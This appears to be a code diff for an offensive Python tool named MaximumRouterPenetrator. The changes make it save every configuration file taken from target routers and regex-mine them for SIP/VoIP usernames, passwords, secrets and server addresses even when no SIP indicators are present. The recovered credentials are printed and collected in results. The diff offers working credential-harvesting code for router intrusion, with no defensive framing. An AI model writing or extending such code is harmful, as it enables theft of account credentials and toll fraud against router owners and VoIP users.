@@ -1464,6 +1464,8 @@ class MaximumRouterPenetrator:
             # Look for SIP-related content
             sip_indicators = ['sip', 'voip', 'phone', 'account', 'password', 'username', 'server', 'proxy']
             found_indicators = [indicator for indicator in sip_indicators if indicator.lower() in content.lower()]
+            
+            # Always try to extract SIP data, even if no indicators found
             if found_indicators:
                 print(f"         🔍 SIP indicators found: {', '.join(found_indicators)}")
                 
@@ -1538,7 +1540,98 @@ class MaximumRouterPenetrator:
                         result['sip_accounts'] = []
                     result['sip_accounts'].extend(sip_accounts)
                 
-                # Save config file to disk
+                # Save config file to disk (always save, not just when SIP found)
+                try:
+                    safe_filename = filename.replace('/', '_').replace('\\', '_').replace(':', '_')
+                    if not safe_filename.endswith(('.xml', '.conf', '.asp', '.cgi')):
+                        safe_filename += '.txt'
+                    
+                    with open(safe_filename, 'w', encoding='utf-8') as f:
+                        f.write(content)
+                    
+                    if verbose:
+                        print(f"         💾 Config file saved: {safe_filename}")
+                except Exception as e:
+                    if verbose:
+                        print(f"         ❌ Config file save error: {str(e)[:50]}")
+            
+            # Always try SIP extraction from config files, even without indicators
+            if not found_indicators:
+                if verbose:
+                    print(f"         🔍 No SIP indicators found, but trying extraction anyway...")
+                
+                # Extract SIP account information
+                sip_accounts = []
+                
+                # Look for SIP account patterns
+                import re
+                
+                # Pattern 1: Username/Password pairs
+                username_patterns = [
+                    r'username["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
+                    r'user["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
+                    r'account["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
+                    r'number["\']?\s*[:=]\s*["\']?([^"\'\s]+)'
+                ]
+                
+                password_patterns = [
+                    r'password["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
+                    r'pass["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
+                    r'secret["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
+                    r'pwd["\']?\s*[:=]\s*["\']?([^"\'\s]+)'
+                ]
+                
+                server_patterns = [
+                    r'server["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
+                    r'registrar["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
+                    r'proxy["\']?\s*[:=]\s*["\']?([^"\'\s]+)',
+                    r'host["\']?\s*[:=]\s*["\']?([^"\'\s]+)'
+                ]
+                
+                # Extract usernames
+                usernames = []
+                for pattern in username_patterns:
+                    matches = re.findall(pattern, content, re.IGNORECASE)
+                    usernames.extend(matches)
+                
+                # Extract passwords
+                passwords = []
+                for pattern in password_patterns:
+                    matches = re.findall(pattern, content, re.IGNORECASE)
+                    passwords.extend(matches)
+                
+                # Extract servers
+                servers = []
+                for pattern in server_patterns:
+                    matches = re.findall(pattern, content, re.IGNORECASE)
+                    servers.extend(matches)
+                
+                # Create SIP accounts
+                if usernames or passwords or servers:
+                    sip_account = {
+                        'usernames': list(set(usernames)),
+                        'passwords': list(set(passwords)),
+                        'servers': list(set(servers)),
+                        'source_file': filename
+                    }
+                    sip_accounts.append(sip_account)
+                    
+                    if verbose:
+                        print(f"         📞 SIP Account found in {filename}:")
+                        if sip_account['usernames']:
+                            print(f"            👤 Usernames: {', '.join(sip_account['usernames'])}")
+                        if sip_account['passwords']:
+                            print(f"            🔑 Passwords: {', '.join(sip_account['passwords'])}")
+                        if sip_account['servers']:
+                            print(f"            🌐 Servers: {', '.join(sip_account['servers'])}")
+                
+                # Store SIP accounts in result
+                if sip_accounts:
+                    if 'sip_accounts' not in result:
+                        result['sip_accounts'] = []
+                    result['sip_accounts'].extend(sip_accounts)
+                
+                # Save config file to disk (always save, not just when SIP found)
                 try:
                     safe_filename = filename.replace('/', '_').replace('\\', '_').replace(':', '_')
                     if not safe_filename.endswith(('.xml', '.conf', '.asp', '.cgi')):
@@ -2769,10 +2862,6 @@ class MaximumRouterPenetrator:
                                     if verbose:
                                         print(f"            ✅ VoIP screenshot from {path}: {voip_test['filename']}")
                                     break
-                    else:
-                        if verbose:
-                            print(f"            📸 LIVE DEBUG: Screenshot mode disabled for maximum speed")
-                    
                     # Take screenshots immediately after verification
                     if self.screenshot_mode:
                         if verbose:
